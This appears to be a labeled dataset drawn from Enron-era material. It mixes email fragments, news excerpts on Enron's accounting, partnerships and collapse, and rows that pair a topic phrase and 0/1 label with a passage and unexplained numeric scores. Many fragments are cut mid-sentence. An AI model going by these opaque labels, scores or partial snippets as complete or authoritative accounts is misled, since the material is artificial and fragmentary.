six-to-ten from the NWS called for below-normal temperatures from December
25 to 29.

Forecasts for Thursday called for slightly cooler temperatures, lending
strength to heavy load electricity prices in the Midwest on Wednesday.  Into

Enron officials in recent days have refused to =discuss the arrangements in any detail.One of the questions that the S.E.C. may look into is whether the terminati=on of those transactions should have been treated as a balance sheet item, =or whether it should have been taken as a loss that affected reported earni=ngs.

record keeping accounting practices,1,"If there is any part of this story that demands an investigation - by Congress, by Justice, by the accounting industry itself - it is the moral failure of a leading firm in the profession to fulfill its moral duty to unflinchingly, and without bias, uncover the truth and present to the weak, the vulnerable and those without influence or voice. But we can't stop at Arthur Andersen. The real ""values"" crisis represented by the Enron mess is far deeper, and stretches across our economy. We are all being victimized by it, and the situation is growing ever worse. It is the great unreported business story of our time: the growing failure of the accounting system to accurately capture what is going in the new hyperspeed economy. Simply put, we have no idea what any company is worth today. The accounting industry is mired in a system that was devised 600 years ago and has only been fine-tuned ever since. It doesn't work any more. Accountants know it, corporate executives know it, and the stock market knows it. The general recognition of this fact has led to a widespread ethical sloppiness made manifest in such things as Arthur Andersen's apparent conflict. The reality is that the only time anybody really checks an audit anymore is after a financial disaster like Enron, when scapegoats must be found. Rear-View Mirror Accounting I once likened traditional accounting to driving a car by only looking in the rear view mirror. It can tell you where a company has recently been, but it is unable to tell you where that company is now. And in a world in which change occurs in nanoseconds, such obsolete data is worthless. Today, events arrive so swiftly, and change so constant, that it is no longer even enough to operate in the present. Modern business now runs in the future. The result is a growing gap between traditional ""book"" value and actual market value - and through that gap drives not only companies like Enron, but truly valuable firms like General Electric and Intel. Traditional accounting has long dealt with that gap through a line entry entitled ""goodwill."" But it was typically only added when a company sold for more than the total value of its inventory, buildings, etc. At most, this goodwill only represented a few percent of the total value. That was then. In the modern economy, for great, fast moving, innovative young companies this so-called ""goodwill"" can represent 90 percent of their value. When a corporate audit can only tell us about ten percent of a company, what the hell is the point? There have been a number of efforts in recent years to come up with innovative new ways to determine corporate value, many of them under the all-encompassing terms ""intellectual capital"" or ""intangible assets"". But they are still in their earliest stages, and most slam up against the formidable wall of the traditional accounting industry.",0.5,0.0,0.9,0.6

the only change that's happened to my long term outlook has been that the 
weather in the short term has been more bullish and we'll have 30 or so bcf 
less storage than i was anticpating in two weeks.  so yea, my curve is a 
touch higher, but it doesnt change my longer term view.  most of the move 
this week was a short sqeeze of spec shorts combined with a strong heat 
market.  a little concerned about heat, but also saw products very strong 
going into the season this past winter only to stage a huge failure.  not 
convinced this rally in products is different.

BusinessSale withdrawal raises Mitie hopesNick Hasell07/14/2001The Times of LondonNews InternationalFinal 245(Copyright Times Newspapers Ltd, 2001)THE sudden withdrawal of a large sell order stoked hopes that Mitie Group will emerge with an upbeat trading statement when it reports full-year figures on July 23. Shares in the maintenance and building services group have fallen from 190p last December, despite optimism that the company will benefit from pledges of increased Government spending on schools and hospitals, some of its biggest clients. Mitie also has a strong record of earnings growth, and gave a positive presentation to analysts in its recent year-end briefing.That meant Mitie followers were relieved yesterday after an unnamed broker unexpectedly pulled an overhanging sell order. The shares rallied 8 1/2p in response to close at 142 1/2p. The FTSE 250 faded 5.1 points at 6,163.8. Tour operators suffered on a first-half profit warning from Switzerland's Kuoni, which complained of problems in Scandinavia. Airtours, the biggest player in the region, lost 25 1/2p at 240p. First Choice Holidays fell 6p to 140p. Incepta, the public relations agency that issued a cautious annual meeting statement last week, gave up 2 1/2p to 51p as UBS Warburg moved from ""buy"" to ""hold"". Richard Nichols, finance director, has bought 20,000 shares at 53p. Hopes of a bullish update from SIG lifted shares in the building materials distributor a further 4p to 224 1/2p. However, some dealers are sceptical, suggesting that the company may have suffered from a slowdown in UK commercial property and a weak German construction market. Half-year figures are due on September 3. Miller Fisher, the loss adjuster that terminated talks on a possible offer in April, tumbled 2 1/4p to 7 1/2p. Numis Securities has a sell recommendation on the shares with an 8p price target, and expresses concern at a recent client defection. Mettoni Group, the AIM-listed provider of call centre technology, recovered 5 1/2p at 40 1/2p as the company reassured that first-half pre-tax profits would be in line with expectations. The shares fell sharply on Thursday on what dealers described as a badly-executed sell order. Paladin Resources was the most active small-cap market after HSBC Securities placed the 20 per cent stake held by Enron, the US energy group. Enron bought into the independent oil producer at 27p in 1998, and sold its 41 million shares yesterday at 44p. With the overhang out of the way, Paladin improved 4 1/2p at 49p.Copyright , 2000 Dow Jones & Company, Inc. All Rights Reserved.",0.0,0.0,0.0,0.2

That gives them a rationale for excluding them from the=ir pro forma calculations.=20Lots of critics disagree, saying such charges are often an inevitable part =of the business cycle and should be reflected in a company's earnings histo=ry. They certainly should not be ignored by investors. ``Charges are real s=hareholder wealth that's been lost,'' argues David W. Tice, manager of the =Prudent Bear Fund, a mutual fund with a pessimistic bent that's up 17% so f=ar this year. ``It's money they spent on something no longer worth what it =was, a correction of past earnings, or a reserve for costs moving forward. =Whatever the reason, it's a real cost to the company, and that hurts shareh=olders.'' Without standards, excessive write-offs from operating earnings c=an obscure actual performance. Without any rules, companies calculate opera=ting earnings inconsistently in order to put their companies in the best po=ssible light. Dell Computer Corp. is a good example of this ``heads I win, =tails you lose'' school of accounting. For years, Dell benefited from gains= in its venture-capital investments and was happy to include those gains in= its reported earnings, where they appeared as a separate line on the incom=e statement. But this year, when those gains turned to losses, the computer= maker issued pro forma numbers that excluded that $260 million drag. Dell =spokesman Michael Maher says the company's press releases and SEC filings b=reak out investment income and give GAAP numbers as well as pro forma. ``In= our view, the numbers are reported clearly,'' says Maher. ``It's all out t=here for the consuming public.''

record keeping accounting practices,1,"""It is basic accounting that you don't record equity until you get cash, and a note doesn't count as cash,"" says Lynn Turner, a former chief accountant for the SEC. ""The question that raises is: How did both partners and the manager on this audit miss this simple Accounting 101 rule?"" Adds Douglas Carmichael, an accounting professor at Baruch College in New York: ""Anyone that's an accountant looking at the entry should have known"" it violated GAAP. An Enron spokesman, Vance Meyer, says, ""The accounting error was just that -- an error,"" explaining that, ""We believed it was not material. However, it was, of course, corrected . . . And we did make the correction with Andersen's concurrence."" He says Andersen ""performed limited quarterly reviews"" of the company's unaudited financial statements and reviewed the entries that resulted in the shareholder-equity overstatements ""to the extent they deemed necessary."" To some who follow the accounting world closely, this has a familiar ring to it. During the past few years, every Big Five auditor has been hit by multiple accounting debacles at high-profile clients. For Andersen, Enron joins a list including Waste Management Inc. and Sunbeam Corp. While the names of the clients may change, the issues remain largely the same. For instance, Enron had reported net income of $105 million for 1997, a figure that Enron last week said will be reduced to $9 million in its upcoming restatement for that year. Enron said the reduction is mostly because of $51 million in various unexplained ""audit adjustments and reclassifications"" that its auditors had proposed in 1997 but at the time had determined to be ""immaterial."" Cumulatively, those immaterial adjustments added up to nearly half of Enron's net income for 1997 and now will be included in the company's restatements. That looks a lot like what happened at Sunbeam. According to the SEC's May settlement order with Sunbeam, Andersen auditors had routinely dismissed so many violations of GAAP as immaterial that they eventually piled up to produce significant distortions in Sunbeam's financial statements, making the barely solvent consumer-products maker look handsomely profitable. Sunbeam filed for Chapter 11 bankruptcy-court protection this past February. In May, the SEC filed a civil lawsuit against five former Sunbeam executives and the Andersen partner in charge of the company's audit, accusing them of engaging in a massive financial fraud; all six defendants have denied the SEC's allegations. Andersen itself wasn't named as a defendant and has said it believes the lawsuit against its partner was an unjustified action over questions of professional judgment.",1.0,0.5,0.8,0.6

It appears that no recordings have been destroyed for at least 2 years.A firm has been contracted to destroy recordings as soon as the go-ahead is given.Obviously we want to be consistent across jurisdictions and I wanted to check with you that the retention period in Houston is still 6 months.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"As for the restatement of earnings going back to 1997, investors said it was clearly having a negative impact on Enron's stock even though some had been expecting it. John Waterman, of Rittenhouse Financial Services, said the information Enron disclosed in a filing with the Securities and Exchange Commission was ""hard to sort through."" Waterman said he was encouraged that the restatement didn't reflect any revenue recognition issues, and it still showed that there was growth in the business - albeit not as much as previously reported. Enron had to restate the earnings because it should have included three of its off-balance sheet financing vehicles - Chewco Investments LP, Joint Energy Development Investments LP, or JEDI, and a unit of LJM Cayman LP - in its consolidated financial statements under the guidelines of generally accepted accounting principles. Revelations about the involvement of Enron's Fastow in LJM are at the center of an investigation by the Securities and Exchange Commission, and led to demands from the financial community that he be terminated. On Wednesday, Enron disclosed it has fired its treasurer, Ben Glisan, and its general counsel, Kristina Mordaunt, as well. Gilsan, Mordaunt, and two former Enron employees were partners of LJM while serving at Enron. Enron continues to say it had controls in place relating to Fastow's involvement with the partnerships. The board required review and approval of each transaction by the office of the chairman, the chief accounting officer and the chief risk officer. Whether these controls and procedures were followed will be investigated by a special committee Enron has named. Many expect that if Enron remains independent, more executive departures could be in store. ""The bottom line from my perspective is that Ken Lay, Jeff Skilling, and the board seemed to be aware (of Fastow's dealings with the LJM partnerships),"" said Andre Meade, an analyst at Commerzebanc Securities. ""Everyone's hands are dirty, including Ken Lay. ... The firing the CFO and treasurer are not going to single-handedly solve the problems at Enron,"" he continued. Others also are questioning the role of Arthur Andersen LLP, Enron's independent auditor. ""People like us have to rely on people like them,"" said Rittenhouse's Waterman.",0.0,0.5,0.9,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Billion-Dollar Numbers The release didn't even mention a larger figure that affectedthe balance sheet: a $1.2 billion drop in shareholders' equityduring the quarter. Chairman and CEO Kenneth Lay disclosed therepurchase in a subsequent conference call. This decline resulted from the company's repurchase of 55million shares from two partnerships, LJM Cayman LP and LJM2 Co-Investment LP, that helped finance projects. Andrew Fastow, whoran both partnerships, was ousted from his job as chief financialofficer last week. Such a one-two punch dealt a blow to investors' fortunes.Since Oct. 17, the day after the earnings release, Enron's shareshave fallen each day and have lost two-thirds of their value. Thelow of $10.90 yesterday was the lowest price since July 1992. Enron's third-quarter statement referred only to a loss on``finance arrangements with a previously disclosed entity'' whichcontributed to $544 million of investment losses. The size of thatitem was later put at $35 million. The latter number amounts to just 3.5 percent of the overallfigure for ``non-recurring'' costs, and less than 1 percent of thecompany's $47.6 billion in revenue for the quarter. Growing Debt Burden The $1.2 billion figure is considerably larger not only indollars, but also in percentage terms. Enron had $11.74 billion ofshareholders' equity as of June 30, according to the balance sheetin its second-quarter 10-Q filing. The reduction equaled more than10 percent of that total. Among other things, the balance sheet also shows that thecompany relied more heavily on debt financing during this year'sfirst half. Short-term debt, due in one year or less, doubled to$3.46 billion. Long-term debt, maturing in more than one year,rose 9.4 percent to $9.36 billion. There's even more to the story of Enron's indebtedness. Thecompany guaranteed $3.3 billion in borrowing by Osprey Trust andMarlin Water Trust, which bought some of its power plants. Unlessthey pay off the debt by reselling the plants, the company mayhave to come up with the difference. Nevertheless, any summary of a company's financial positionprovides a more complete picture than the income statement alone.This also holds true for companies whose finances are in bettershape -- IBM, General Electric and Citigroup, to name three.

Jeremy Thirsk is working on a large ($40-50MM) Methanol prepay agreement with Nissho Iwai - a struggling Japanese counterparty.

EPS Visibility Has Blurred, but Not Much has Changed

* 3 negative pre-announcements in 2 days blurs EPS visibility
We are examining where the weakness has stemmed from - (1)
smaller, regionally-focused businesses (EXC) and (2) aggressive
power price forecasts (AES & RRI).
* Some companies have reaffirmed '01 and even '02 EPS guidance
DUK, ETR, ILA, MIR, NRG, PPL & SRE have reaffirmed 2001
EPS guidance. ETR and MIR have also reaffirmed 2002 EPS
guidance. Informally reaffirmed - CPN, D, MIR, PEG & TXU.
* Trading, CA generation and peaking plant income appear most volatile
Inside we try to identify stocks with exposure to these businesses
and quantify what percentage of our estimates they represent.
* Believe EPS downside risk should be limited to 15%
Both CEG and RRI missed estimates by roughly this amount.
RRI also reduced its growth rate to 15% - we have always
assumed long-term growth rates would come down to 15-20%.
* Reduced EPS expectations are already priced into stocks
Group multiple is roughly 9X, with some stocks at 7X P/E
multiples - implying 0.4-0.6X PEG ratios. This valuation
appears too heavily discounted for 15% EPS downside risk.

ENA, under a servicing agreement, is the servicer of the assets. i am attaching for your information the servicing guidelines in the agreement. the major restriction is that ENA cannot sell assets for less than the contributed value into the structure. any EARLY warning of a potential sale of any of these assets would be greatly appreciated so we can check whether any restrictions apply and be ready, as there are some logistics involved. an email to donna lowry, mary heinitz and myself would be wonderful. if you do not do this, you may get on donna's list. of course i can't speak for her as to the repercussions envisioned, but let me suffice it to say that i am glad i am not on her list. at least that i know of. 2. a number of these assets also have raptor hedges in place in addition to being in the velocity structure. only the portion of the investment that was on ENA's balance sheet was hedged. if an asset is sold that has been ""raptorized"", the swap will need to be promptly terminated/notional amounts adjusted etc. again, give us as much notice as you can.3. we also need notice (AHEAD OF TIME) of any follow on investments in the same merchant assets, exchanges of our interest or further fundings because STUFF will have to be done. i will not bore you with the details, but this STUFF cannot be done in ONE MINUTE contrary to the popular opinion of some business types whose names i will not mention here. we also are obligated to provide quarterly reports of the investments which describe any modifications to the investments during that calendar quarter. the first report is due april 11, 2001 for the first quarter of this year. we will be asking for your input with respect to your investments at the end of march. 4. lists of assets currently in velocity and in raptor are attached fyi.",0.5,0.3,0.8,0.2

mark to market accounting practices,1,"""There could be a quality-of-earnings issue,"" says Tom Linsmeier, an associate professor of accounting at Michigan State University, who co-authored the U.S. Securities and Exchange Commission's rules on market-risk disclosures for financial instruments. ""There certainly might be great volatility that could cause what now looks like a winning, locked-in gain to not arise sometime in the future."" The companies reject any suggestion that there may be quality problems with their earnings. But at the heart of the situation is an accounting technique that allows companies to include as current earnings those profits they expect to realize from energy-related contracts and other derivative instruments in future periods, sometimes stretching over more than 20 years. So-called mark-to-market accounting is mandated by accounting-rule makers when companies have outstanding energy-related contracts on their books at the end of a quarter, such as agreements to sell electricity or buy natural gas over a period of time at certain prices. Under those rules, companies estimate the fair market values of those contracts on their balance sheets each quarter as assets or liabilities. Changes in the value of a contract from quarter to quarter then are either added to or subtracted from net earnings. If, for instance, the market price for natural gas rises above the price specified in a company's contract to buy gas, generally the company will record an unrealized gain. That gain is recognized as income and recorded as an asset on the company's balance sheet. At the end of each quarter, the contract is revalued. The value of the previously recorded asset is increased, and any increase in unrealized gain is recorded as additional income. Conversely, if the market value for gas falls, and the value of the contract has declined, any change in the contract's value is recorded on the company's balance sheet, and a loss is recorded on its income statement. e Yet in their financial reports, the companies only vaguely describe the methods they use to come up with fair-value estimates on the contracts. Increasingly, quoted market prices offering independent guidance are becoming readily available for several years into the future. However, with some long-term derivative instruments, particularly electricity contracts, future market prices don't extend far enough to cover the full life of those contracts. And in those cases, companies are allowed to base valuations on their own undisclosed estimates, assumptions and pricing models. ""Ultimately they're telling you what they think the answer is, but they're not telling you how they got to that answer,"" says Stephen Campbell, an analyst at Business Valuation Services in Dallas. ""That is essentially saying `trust me.'""",0.5,0.5,0.8,0.2

mark to market accounting practices,1,"Investors are asking hard questions, and not always getting the answers they want. Using mark-to-market methods, a company calculates the fair market value of a commodity position - whether it's a contract, an option, a swap, etc. - at the time, even if the value of the position is realized over a longer period. The problem with this method is the actual cash a company realizes from the position might not be the same value the company calculated in its original assessment. Also, sometimes it isn't easy to calculate the fair value of the commodity position. This is particularly true in instances where the market for the commodity isn't liquid. Over time, companies with the highest level of disclosure regarding their mark-to-market gains will most likely trade at higher multiples to counterparts that provide little or no disclosure, said ABN AMRO Inc. analyst Paul Patterson. Encouragingly, it appears companies may already be responding to the call for added disclosure. According to a survey Patterson conducted, more companies with energy trading units were willing to disclose the details of their mark-to-market accounting practices during third-quarter conference calls compared with those in the second quarter. Patterson said he prefers earnings that are cash-based. ""All things being equal, we believe reported earnings that more closely reflect the timely realization of cash have a higher quality associated with them than earnings that do not,"" he said. He expects investors to become smarter and learn to distinguish between earnings growth through accrual accounting and growth fueled by mark-to-market accounting. At the end of the day, it is not a matter of simply producing profits, but being able to say where those earnings came from, said one investor, who manages a pension fund. Some investors also may be placing a greater emphasis on the cash flow the energy merchants produce. Tim O'Brien, portfolio manager of the Gabelli Utilities Fund, said energy merchants that own the physical power assets to back up their trading positions should trade at a premium to an independent power producers and traditional utility companies. Still, the stocks should be valued at less than the growth rate of the company because of their heavy exposures to commodity prices. Energy merchants include companies such as Dynegy Inc. (DYN), Duke Energy Corp. (DUK) and Dominion Resources Inc. (D). According to O'Brien, the group never deserved to have the price-to-earnings multiples above 20- to 30-times earnings, which were once paid for the stocks. ""We all got sucked up by the up-leg of the cycle and forgot just how cyclical these companies are,"" O'Brien said, adding that the average multiple should be in the high single-digits to the high-teens.",0.0,0.0,0.7,0.2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"11/20/2001Business Wire(Copyright (c) 2001, Business Wire)HOUSTON--(BUSINESS WIRE)--Nov. 20, 2001--In a class-action lawsuit filed today in U.S. District Court, employees of Enron Corp. (NYSE:ENE) claim the company recklessly endangered their retirement funds, causing some employees to lose hundreds of thousands of dollars almost overnight. The suit also claims that after a surprising third quarter loss announcement, Enron illegally locked down employee retirement plans, making it impossible for employees to protect their already damaged retirement funds from a 70 percent drop in Enron stock price.Filed by attorney Steve Berman of the Seattle-based law firm Hagens Berman on behalf of a proposed class of participants in the Enron Stock Plan, the suit claims Enron retirement plan managers withheld crucial information on the risks of investing in Enron stock. Instead of being warned of the risks, employees were encouraged to invest heavily in Enron stock, according to the suit. Named plaintiff Roy Rinard, a long-time employee, had more than $470,000 of his retirement savings invested in Enron stock on the advice of Enron plan administrators. Now his retirement fund is worth just $70,000 -- a loss of $400,000 in a little more than a month. ""I feel like I have been betrayed,"" said Rinard. ""I have lost my savings, my plans for the future, everything."" On Oct. 17, Enron locked down employee 401(k) accounts, preventing employees from moving any of their investments out of Enron stock. Since then, employees have watched in horror as the company's stock plunged more than 70 percent after an announcement of a $618 million third quarter loss. According to the suit, Enron executives engaged in extensive insider trading prior to the Oct. 16 announcement, gaining millions of dollars in personal proceeds. The class-action suit seeks to represent as many as 21,000 employees who invested in the Enron Stock Plan between Jan. 20, 1998 and Nov. 20, 2001. On October 16, 2001, Enron surprised the market when it announced that the company was taking non-recurring charges totaling $1.01 billion after-tax in the third quarter of 2001. Enron later revealed that a portion of the charge was related to the unwinding of investments with certain limited partnerships controlled by Enron's CFO, and the company would be eliminating more than $1 billion in shareholder equity as a result of the unwinding of investments.

The company held regular seminars to =teach EES employees how to use complex financial vehicles to woo customers,= manage earnings, and, naturally, keep debt off balance sheets at Enron and= its clients.

Boutcher, manager of business development at =EES until Enron's December collapse, says that creating complex financings =with clients was standard practice. And, he says, Enron used them far more =aggressively than its rivals. ``We could always sweeten the pot, and the ob=jective was to beat out anybody that was competing against us,'' says Boutc=her. An Enron spokeswoman says such equipment financing was common in the i=ndustry. But several rivals disagree.In a presentation on Nov. 9, 2000, to some 60 employees in Houston, Boutche=r says, a company lawyer explained how structured-finance deals could manag=e and accelerate earnings for Enron and take debt ``off credit'' for custom=ers, so that it wouldn't be reflected in credit ratings. The objective laid= out in one page of the presentation couldn't have been clearer: ``Off cred=it: Difficult to achieve. ...Must make it look like the company has no fina=ncial obligation at all under any circumstances, including default by them.=''=20EES says it never actually did one of the ``off-credit'' deals.

mark to market losses,0,"Subject: As you know, John and I now have quarterly business reviews with each of our business and commercial support units and I thought it might be helpful to provide you with a brief overview of Q1 and the areas of focus going forward prior to your visit.IBIT ? Enron Europe delivered Q1 IBIT of $86.9m ($6.4m over target). This is after covering Margaux losses of $12.2m not in plan. ? Net Income at $54.1m was $25m over target after absorbing Margaux losses. This is due to:- $10m interest savings from the Camelot transaction, which has now moved more of the metal inventory financing costs into gross margin.- the adoption of FAS 133 which produced a net gain of $13m as a result of marking to market contracts which were previously accounted for on an accruals basis.? On a like for like basis compared to 2000, our Gas and Power businesses (UK, Continental, ETOL and Enron Direct) have (circa) doubled IBIT from $70m to $134m and Net Income from $46m to $107m.? Metals generated a net loss before taxes of $54.6m. This comprised gross margin of $7.7m, expenses of $42.5m and interest of $19.8m (net of receipts). (This does not include interest on funds used for the MG acquisition).EXPENSES? Reduction in our expense base continues to be a significant focus, resulting in lower than plan expenses of $16m. If you exclude metals which is $10m over plan and the $8.8m bonus accrual against $5m in the plan, you will note that we reduced our expenses by approximately $29m in the rest of our business. The plan itself was materially lower than that presented to John and I by the business and support groups. We are therefore making significant progress in respect of reducing our expenses, we expect continued savings to be made particularly as we are able to start extracting savings from the metals business.HEADCOUNT? We are about 50 down on plan for headcount and I would expect this trend to continue. Again we will see significant headcount reductions when the metals systems are functioning (Metals headcount is 622 with an additional 70 full time staff working on Metals support).? Headcount will be reduced by over 20 in the Middle East.(NB. The headcount numbers include full time temp and contract staff, which make up about 10% of our headcount)TRAVEL & ENTERTAINMENT? Total costs are down 25% on budget with the total number of flights down by 58% on budget. The major spender is Metals which accounts for 25% of all costs.OVERSEAS OFFICES? We are in the middle of a full scale review of each of our offices and will close or downsize those that do not make sense from a P&L or franchise perspective.IT",0.3,0.0,0.7,0.6

By that time, the stock's drop -- which reached99 percent today -- was already well under way. Trio of Lawsuits Enron later reported $1.01 billion in third-quarter charges;ousted Chief Financial Officer Andrew Fastow, who ran partnershipsthat accounted for some of the charges; restated its results since1997; became the target of an SEC accounting investigation; andaccepted a takeover bid from Dynegy Inc., its biggest rival. The company's shares, which ended last year at $83.13, fell aslow as $1.05 today before a midday trading halt as Enron's debt wasdowngraded to junk-bond status and Dynegy abandoned its offer. In response to the plunge, employees in the 401(k) plan --which allows workers to defer part of their pay and build tax-freesavings, and takes its name from a section of the Internal RevenueService code -- have filed three lawsuits against Enron. The suits allege, among other things, that the Houston-basedcompany prevented employees from shifting investments within theplan between Oct. 17, the day after its disclosure of the charges,and Nov. 19 as the company made administrative changes. All three seek class-action status on behalf of the plan'sparticipants. The most recent filing came from the Gottesdiener LawFirm, based in Washington, on Monday. It covers the longest timeperiod: November 1995 to now. Falling Percentages Enron shares accounted for 64 percent of the savings plan'sassets at the end of 1994, the year before the period associatedwith the Gottesdiner suit began. The figure reflected a one-timecompany contribution of preferred stock, and rose from 62 percentin 1993. Each preferred share has a face value of $100 and isconvertible into 27.304 common shares. This translates into aconversion price of $3.66 a share, which was a bargain beforetoday's trading. The plan also owned a stake in Enron's former oil and gasunit, which became EOG Resources Inc. after gaining independence in1999. Add in those shares, and company stock represented about two-thirds of the 1994 assets. Enron's common and preferred shares fell to 60 percent of401(k) assets available for benefits in 1995, 58 percent in 1996and 53 percent in 1997 as the U.S. stock market rallied, liftingthe value of participants' investments in equity mutual funds. The shares represented 49 percent of the plan's assets in1998. The proportion hit bottom at 46 percent in 1999, when theassets more than doubled -- exceeding the 56 percent increase inEnron's share price that year -- to $1.62 billion.

Several of us are attempting to determine the number of options we will 
receive.  

The following is an excerpt from an E-speak discussion with Cindy Olson 
regarding the new Enron Option Plan effective Dec. 29, 2000.


The number of options will be based upon a Black-Scholes value. 

Black-Scholes is based upon a number of factors, including the stock price, 
the risk-free rate of return, the term of the stock options, 
and the general movement of Enron common stock as compared to the general 
stock market. 
The Black-Scholes value for Enron stock options is determined monthly. 

As of October 1, 2000, the Black-Scholes value for Enron stock options was 
$31, for seven-year options.

To estimate the number of options you might receive, divide 25 percent of 
your annual base salary by the Black-Scholes 
value for Enron stock.


Therefore we must find out the year end or Dec. Black-Scholes value for ENE.

just applied for post-baccalaureate status at U of O, so I can start taking 
economics and poli sci classes online. (I just got my new FREE computer from

serious about graduate school. I think I've decided on international studies

my dream program at Johns Hopkins University in Washington, D.C. It's a

Subject:	EWS versus ENA in West Ohio Gas

Don/Rogers,

We have a situation that occurred today where ENA beat us on a retail gas deal.  I don't know how accurate our information is in this case but I wanted to pass this on to you for further consideration:

1.  Energy Gateway is a retail gas portal where users can request proposals for gas supply to Commercial and Industrial sites.

2.  EWS Gas Desk (fka EES Gas Desk) monitors and makes offers on the system where the buyers meet our requirements.

3.  Procter and Gamble requested bids today for a site inside West Ohio Gas that is supplier balanced.

4.  P&G wanted a one year deal beginning 7/2001.

5.  Load was shaped and averaged 534 MMBtu/day or 195,200 MMBtu per year.

Bottom line:  We were beat by ENA by 7 cents/MMBtu.  

I don't think we need to compete against each other and had ENA not bid we would have been the low bid at a price that was 7 cents higher.  Your thoughts?

Attached please find an electronic copy of a memorandum that I prepared this 
week in connection with the claim by International Gas Limited (""IGL"") 
against Enron Exploration Company (""EEC"").  The claim appears to relate to 
the recent execution of an upstream gas development ""Term Sheet"" in 
connection with Project Dolphin, and certain rights IGL believes it has to 
participate in the benefits of such Term Sheet pursuant to a May 18, 1994 
Agreement that was executed between IGL and EEC in connection with Enron's 
earlier Qatar LNG Project.

I understand from discussions the other day with Bob Williams and Don 
Wendland of EOG Resources Inc. (""EOG"") that EOG will in all likelihood ask 
Pettman Smith (IGL's counsel in London) for an extension of the requested 
April 16 response date.

If you have any questions or comments on this memorandum, or if I can be of 
further assistance in connection with this claim, please do not hesitate to 
call on me.

Kind regards,

AT&T EXITS FIXED WIRELESS BUSINESS;
QUARTERLY RESULTS SURPASS EXPECTATIONS

After tinkering for five years with fixed-wireless technology as a
way to bypass incumbent local exchange carriers (ILECs) and reach
consumers directly, AT&T Wireless Services, Inc., is killing the
venture formerly known as ""Project Angel.""  It took too much time,
money, and effort to deploy the service, and the financial return
was less than AT&T Wireless earns from other operations, executives
said today.

Fixed wireless antenna towers, for example, were expensive and
time-consuming to build, and new subscribers often had to wait too
long for ILECs to transfer their service to the fixed wireless
system, said John Zeglis, AT&T Wireless's chairman and co-chief
executive officer.  ""These challenges probably could have been
met,"" he said during a conference call with financial analysts.=20
""But we don't have that much patience for a nonstrategic business.""

AT&T Wireless inherited the fixed wireless business from AT&T Corp.
when the two companies began separating last year.  AT&T
essentially invented fixed wireless technology and began market
tests in 1997.  Despite setbacks, AT&T continued to invest in the
venture, then known as Project Angel.  Some skeptics surmised that
the existence of the fixed wireless program gave AT&T ammunition in
its negotiations with other network operators for access to
consumers.

AT&T Wireless's goal was to have 100,000 customers for the fixed
wireless service, which competes aga",0.0,0.0,0.7,0.2

Not only does it not release its cash flow statement during each quarter's conference call and press release, something we don't like but is prevalent, it also doesn't release its balance sheet. The company must think we're idiots. They're wrong. By Tom Jacobs <<http://www.fool.com/About/staff/tomj.htm>> (TMF Tom9) October 24, 2001 Enron's (NYSE: ENE) <<http://quote.fool.com/uberdata.asp?symbols=ENE>> troubles just don't stop. On Monday, the company announced <<http://www.enron.com/corp/pressroom/releases/2001/ene/70-LJMfinalltr.html>> that the Securities and Exchange Commission (SEC) had requested information on ""certain related party transactions <<http://www.fool.com/specials/2001/sp010802e.htm>>."" That was a veiled reference to partnerships until recently organized and directed by Enron CFO Andrew Fastow. There has been a flurry -- a hailstorm -- of financial media attention to this. There are only three possibilities, and none is palatable:The company's board allowed this deal in order to -- using corporate speak -- ""incentivize"" the CFO, and it was not legal; It was legal, but unethical; or Enron has been less than forthcoming, perpetuating a pattern of disdain for investors and keeping them in the dark. The accounting machinations involve mind-numbing terms and obfuscation, making a simple explanation of what is being alleged above my capacity to provide. The New York Times' Floyd Norris calls them ""some of the most opaque transactions with insiders ever seen."" That leads me to one conclusion when I think about burying myself with the company's SEC filings, accounting texts, my high-speed Web connection, and some beer: that of Shakespeare's King Lear -- ""that way madness lies."" On the one hand, I know that pulling all this apart might teach me useful things about accounting, reading financial statements, and finding trouble. (To read what this is all about, check the ""Certain Transactions"" section of the company's latest proxy statement <<http://quote.fool.com/sec/sec.asp?date=03/27/2001&currTicker=ene&symbols=ene&guid=%7B5D0F1D1D%2D5DB7%2D4F4E%2D9BD9%2DFA154603F662%7D>>.) I fully intend to do that -- someday. For now, though, all I need to know about Enron as an investment is that the company has not made these issues transparent.What's worse, though, is that Enron has made it a habit to keep investors in the dark, and not only about the potentially troublesome CFO issue. The company goes out of its way to hide its true financials. That really cheeses me off.The quarterly call and press release parade",0.8,0.0,0.8,0.2

week.  The language which stated that any entity supplying power to DWR
would be considered a public utility was deleted from the bill.  After the

deleted from the bill.  In its place was inserted language stating the goal
of DWR was to procure power at the lowest price possible per kWh.  The

Van,

It's nice to hear from you. I am sure that you can always come back 
to Enron if you don't like living in New York.

I used to work for Salomon and chances are you will be working in the same 
building in lower Manhattan where I spent 7  years of my life.

I hope you have a great Holiday  Season.

Dear Vince:

I just wanted to get in touch with you, as my last fall semester here
draws to a close and this is something of a transition point for me.  To
update you on my job search, I have been extended an offer for a position
within Enron's Analyst Program.  The offer was very attractive and I had
numerous things to consider in reaching my decision.  Unfortunately, I
will be declining Enron's offer of employment to take a position in the
Investment Banking Division of Salomon Smith Barney in New York.  My
preference at this point is to live outside of Houston, and although my
hope is also to return to Houston in future, New York offers some
exciting options for me now.  I will be starting there in July of this
summer.  I hope that I will have future opportunities to be an advocate
of Enron and look forward to keeping in touch with you and the Research
Group.

Please give my regards to everyone at the office and wishes for a very
happy holiday season!  Also please feel free to contact me at any time.
I can give you my future contact information when I have it.

Thank you and I hope I'll see you again.

Sincerely,
Van

P.S.  Feel free to forward my news onto Mike Roberts if that would
appropriate.  I didn't have his email with me.

